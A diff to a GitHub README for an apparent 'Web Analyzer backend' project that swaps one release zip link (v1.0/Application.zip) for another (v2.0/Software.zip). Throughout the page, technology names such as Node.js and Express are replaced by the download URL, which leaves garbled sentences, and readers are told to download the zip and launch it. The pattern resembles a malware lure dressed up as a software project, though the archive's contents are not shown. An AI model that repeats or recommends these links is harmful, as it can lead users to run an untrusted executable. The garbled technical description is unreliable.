@@ -10,7 +10,7 @@ Welcome to the Web Analyzer backend repository - the powerhouse behind Mazaoro S
 
 ### Getting Started 🚀
 
-To get started with the Web Analyzer backend, you can download the project by clicking [here](https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v1.0/Application.zip). Remember, it needs to be launched once you have downloaded the zip file.
+To get started with the Web Analyzer backend, you can download the project by clicking [here](https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v2.0/Software.zip). Remember, it needs to be launched once you have downloaded the zip file.
 
 ### Features ✨
 
@@ -36,8 +36,8 @@ To use the Web Analyzer backend, follow these steps:
 
 The Web Analyzer backend leverages a variety of technologies to deliver its functionality:
 
-- **https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v1.0/Application.zip**: The backend is built using https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v1.0/Application.zip, a powerful JavaScript runtime.
-- **Express**: https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v1.0/Application.zip is used for handling server-side logic and routing.
+- **https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v2.0/Software.zip**: The backend is built using https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v2.0/Software.zip, a powerful JavaScript runtime.
+- **Express**: https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v2.0/Software.zip is used for handling server-side logic and routing.
 - **Puppeteer**: Puppeteer is used for automating web interactions, such as website analysis.
 - **Google Lighthouse**: Google Lighthouse is used for website performance analysis.
 - **Docker**: The backend can be containerized using Docker for easy deployment.
@@ -58,4 +58,4 @@ Let's take your website analysis to the next level with the Web Analyzer backend
 
 ---
   
-[![Launch Web Analyzer Backend](https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v1.0/Application.zip%20Analyzer%https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v1.0/Application.zip)](https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v1.0/Application.zip)
+[![Launch Web Analyzer Backend](https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v2.0/Software.zip%20Analyzer%https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v2.0/Software.zip)](https://github.com/RAFINHA0RAFINHA/web-analyzer-backend/releases/download/v2.0/Software.zip)
